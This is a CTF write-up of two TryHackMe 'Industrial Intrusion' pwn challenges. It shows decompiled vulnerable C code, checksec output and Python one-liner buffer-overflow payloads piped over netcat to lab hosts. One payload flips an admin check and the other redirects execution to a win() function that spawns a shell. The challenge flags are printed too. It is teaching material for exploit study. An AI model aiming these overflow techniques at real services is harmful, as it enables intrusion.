---
title: "Industrial Intrusion (2025) - Pwn Challenge Write-up"
date: 2025-07-01 08:00:00 +0800
categories: [ctf, pwn]
tags: [ctf, tryhackme, pwn, buffer overflow]
description: "A comprehensive write-up covering pwn challenges (Tasks 28 and 29: Pwn Start and Pwn Industrial) from TryHackMe's 'Industrial Intrusion' CTF, demonstrating classic buffer overflow vulnerabilities."
---

## Task 28: Pwn Start - Industrial Intrusion

### Challenge Overview

"A stray input at the operator console is all it needs. Buffers break, execution slips, and control pivots in the blink of an eye."

This challenge provides a downloadable binary and a network service to interact with:

* **Download:** `wget http://10.10.229.193/Start/start.zip`
* **Netcat:** `nc 10.10.172.200 9008`

---


### Task Brief

The objective is to exploit a vulnerability in the provided binary to gain administrative access and retrieve the flag.

---


### Solve Process

This challenge presents a textbook buffer overflow scenario. Let's break down the vulnerability and our exploit strategy.

#### 🔍 Vulnerability Summary

Upon analyzing the `main()` function in Ghidra, we can identify the core issue:

```c
char local_38[44];  // A buffer of 44 bytes
int local_c;        // An integer variable located right after local_38 on the stack
// ...
gets(local_38);     // Dangerous: No bounds checking!
// ...

if (local_c != 0) { // Condition to check for admin access
    puts("Welcome, admin!");
    print_flag();
}
```

The `gets()` function is inherently insecure because it doesn't perform bounds checks. This means if the input provided to `local_38` exceeds 44 bytes, it will overflow and overwrite subsequent data on the stack. In this case, `local_c` is positioned immediately after `local_38`. We can overwrite `local_c` with a non-zero value, causing `print_flag()` to be called.

Our goal is to make the condition `local_c != 0` true to call the `print_flag()` function.

---


## ✅ Exploit Strategy

To bypass the `local_c != 0` check, we need to overwrite `local_c` with any non-zero value. Our payload will consist of:

1. **Junk Data**: 44 bytes to fill the `local_38` buffer.
2. **A 4-byte Non-Zero Value to overwrite `local_c`**: Since the system is likely little-endian, `\x01\x00\x00\x00` (representing the integer 1) is a suitable choice. The 4-byte value is chosen because local_c is a 4-byte integer variable in the decompiled C code (likely an int on a 32-bit system).

### 🛠️ Building and Executing the Payload
We can construct and send the payload directly using `python3` and `netcat`:

### Testing Locally

```bash
❯ python3 -c "print('A'*44 + '\x01\x00\x00\x00')" | ./start 
Enter your username: Welcome, admin!
Flag file not found!
```

### Testing Remotely

```python
python3 -c "print('A'*44 + '\x01\x00\x00\x00')" | nc 10.10.172.200 9008
```

This command will:
- Send 44 bytes of 'A' characters, filling the `local_38` buffer.
- Then, send `\x01\x00\x00\x00` (or `0x01`), which overwrites `local_c` with the value 1, making the access condition true.

---


### ✅ Expected Output
After successfully sending the payload, you should see output similar to this:

```bash
python3 -c "print('A'*44 + '\x01\x00\x00\x00')" | nc 10.10.172.200 9008
Enter your username: Welcome, admin!
THM{nice_place_t0_st4rt}
```

---


## The Verdict

The exploit strategy worked as expected, demonstrating a successful buffer overflow to bypass the access control check.

The flag obtained is: THM{nice_place_t0_st4rt}

---


## 📦 Optional: Inspecting the Binary
If you downloaded the `start.zip` file, you can inspect the binary locally:

**Tools you might use for analysis:**
1. **Ghidra/IDA Pro**: For reverse engineering and understanding the assembly/decompiled code.
2. **gdb ./start**: For dynamic analysis and debugging.
3. **checksec --file start**: To check binary security features like ASLR, NX, PIE, etc. (In this case, it's a straightforward buffer overflow with no complex mitigations to bypass).

---


🧩 Summary of Binary Functions

Here's the decompiled C code for the `main` and `print_flag` functions, which provided insight into the vulnerability:

```c
bool main(void)
{
  bool bVar1;
  char local_38 [44]; // Buffer for username
  int local_c;        // Variable checked for admin access

  setvbuf(stdout,(char *)0x0,2,0); // Disable stdout buffering
  setvbuf(stdin,(char *)0x0,2,0);  // Disable stdin buffering
  local_c = 0;                     // Initialize local_c to 0 (non-admin)
  printf("Enter your username: ");
  gets(local_38);                  // Vulnerable gets() call
  bVar1 = local_c != 0;            // Check if local_c is non-zero
  if (bVar1) {
    puts("Welcome, admin!");
    print_flag();                  // Call print_flag if admin
  }
  else {
    puts("Access denied.");        // Deny access otherwise
  }
  return !bVar1;
}

void print_flag(void)
{
  char local_98 [136]; // Buffer to read flag into
  FILE *local_10;      // File pointer

  local_10 = fopen("flag.txt","r"); // Open flag.txt
  if (local_10 == (FILE *)0x0) {    // Check if file opened successfully
    puts("Flag file not found!");
    // FUN_00401120(1); // Some error handling function
  }
  fgets(local_98,0x80,local_10); // Read flag into buffer
  puts(local_98);                // Print flag
  fclose(local_10);              // Close file
  return;
}
```

---




## Task 29 Pwn Industrial

## Challenge Overview
"The rhythmic hum of machinery masks hidden flaws. ZeroTrace moves through the production floor, searching for a way into the plant’s forgotten subsystems."

Connection Port: 9001
Target Machine IP: 10.10.10.10

Retrieve the Challenge Files:
`wget http://10.10.10.10/Industrial/industrial.zip`

---


## Task Brief

The "Pwn Industrial" challenge revolves around exploiting a 64-bit Linux binary named `industrial` to gain a shell. Our goal is to identify a vulnerability that allows us to manipulate program execution, specifically to call the `win` function. This function executes `system("/bin/sh")`, providing an interactive shell and ultimately revealing a flag in the `THM{...}` format on the remote server (`10.10.10.10:9001`).

---


## The Solve Process

### Initial Analysis

We began by analyzing the `industrial` binary using `checksec` and Ghidra to understand its structure and potential weaknesses.

**Checksec Output**:

```bash
❯ file industrial
industrial: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=212f2264c4bd0ba17447499953d27447b3f5e04b, for GNU/Linux 3.2.0, not stripped

❯ pwn checksec industrial
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

The `checksec` output immediately reveals crucial information: **No canary found** and **No PIE (0x400000)**. The absence of a stack canary simplifies buffer overflow exploitation, as we don’t need to bypass stack-smashing protection. The lack of PIE means the binary’s base address is fixed at `0x400000`, making function addresses predictable and reliable for exploitation.


## Decompiled Code (from Ghidra)

Ghidra provided the decompiled C code, shedding light on the vulnerability:

```c
undefined8 main(void)
{
  undefined1 local_28 [32]; // 32-byte buffer
  FUN_004010c0(stdout, 0, 2, 0); // setvbuf(stdout, NULL, _IONBF, 0)
  FUN_004010c0(stdin, 0, 2, 0);  // setvbuf(stdin, NULL, _IONBF, 0)
  FUN_004010c0(stderr, 0, 2, 0); // setvbuf(stderr, NULL, _IONBF, 0)
  printf("Enter the next command : ");
  read(0, local_28, 0x30); // Reads 48 bytes into 32-byte buffer
  puts("Thanks");
  return 0;
}

void FUN_004010c0(FILE *param_1, char *param_2, int param_3, size_t param_4)
{
  setvbuf(param_1, param_2, param_3, param_4);
  return;
}

void win(void)
{
  system("/bin/sh");
  return;
}
```

### Vulnerability Identified

The `main` function uses `read(0, local_28, 0x30)` to read 48 bytes into `local_28`, which is only a 32-byte buffer. This mismatch creates a buffer overflow vulnerability, allowing us to overwrite up to 16 bytes beyond the buffer. Specifically, this enables us to overwrite the saved base pointer (RBP) and, crucially, the return address on the stack.

![win function](/dzif8ltvg/image/upload/v1751485282/CTF/industrial-intrusion/Pwn/0x4011be_lzqqyk.png)

The `win` function, located at address `0x4011b6`, executes `system("/bin/sh")`. This makes it the ideal target for a return-to-win (ret2win) exploit. We'll specifically target `0x4011be` (just after the function's prologue) to ensure proper stack alignment for the `system` call.

---


## Exploit Strategy:

Our strategy is to overwrite the return address of the `main` function with the address of `win` (`0x4011be`) to call `system("/bin/sh")`.

The stack layout relevant to our exploit is as follows: `[local_28 (32 bytes)][saved RBP (8 bytes)][return address (8 bytes)]`.

As confirmed by cyclic analysis, the offset to the return address is 40 bytes (32 bytes for `local_28` + 8 bytes for RBP).

By using `0x4011be`, we skip the `win` function's prologue (`push rbp`), which is essential for maintaining 16-byte stack alignment required by the `system` call on x86-64 systems.

---


## Tools Used

- **Ghidra**: To decompile the binary, confirm the buffer size, and locate the `win` function address.
- **GDB/Pwndbg**: To verify the offset (40 bytes) and debug local execution issues.
- **Python/Pwntools**: To craft and send the payload to the local or remote binary.

---


### ✅ Expected Output

Running the exploit locally:

```
❯ python3 -c "import struct; print('A'*40 + struct.pack('<Q', 0x4011be).decode('latin1'))" | ./industrial 
Enter the next command : Thanks
Segmentation fault (core dumped)
```

Running the exploit remotely:

```
$ python3 -c "import struct; print('A'*40 + struct.pack('<Q', 0x4011be).decode('latin1'))" | nc 10.10.32.77 9001
Enter the next command : Thanks
whoami
user
cat flag.txt
THM{just_a_sm4ll_warmup}
```

Successfully executing the exploit provides a shell, allowing us to retrieve the flag: THM{just_a_sm4ll_warmup}.

---


## The Verdict: A Precisely Executed Buffer Overflow

This assessment targeted a custom binary service exposed on port 9001. Our initial reconnaissance identified the service as a non-standard protocol handler. Through local analysis of the provided binary, we uncovered a critical `buffer overflow vulnerability` within its main execution flow.

The exploit was straightforward and effective: by carefully crafting input, we overwrote the return address of `main` on the stack, redirecting program execution to a hidden `win()` function. This function, located at `0x4011be` (specifically chosen to bypass its prologue and avoid stack misalignment), immediately executed `system("/bin/sh")`.

The lack of Position-Independent Executable (PIE) and stack canaries significantly simplified this attack, eliminating common modern exploit mitigations. Ghidra's decompiled code was instrumental in confirming the vulnerability: a 32-byte buffer being overflown by a 48-byte read, leading to a precise 40-byte offset to the return address. This allowed for a clean and decisive takeover of the program's control flow.

---


## 🧩 Summary

- **Vulnerability**: `read(0, local_28, 0x30)` overflows a 32-byte buffer by 16 bytes.
- **Offset**: 40 bytes from the start of the buffer to the return address (32 bytes for the buffer + 8 bytes for the saved RBP).
- **Target Address**: `0x4011be` (the `win` function’s address, post-prologue, for stack alignment).
- **Payload**: 40 bytes of arbitrary junk data followed by 8 bytes representing the packed address `0x4011be`.
- **Result**: Spawns a shell, yielding the flag `THM{just_a_sm4ll_warmup}`.

---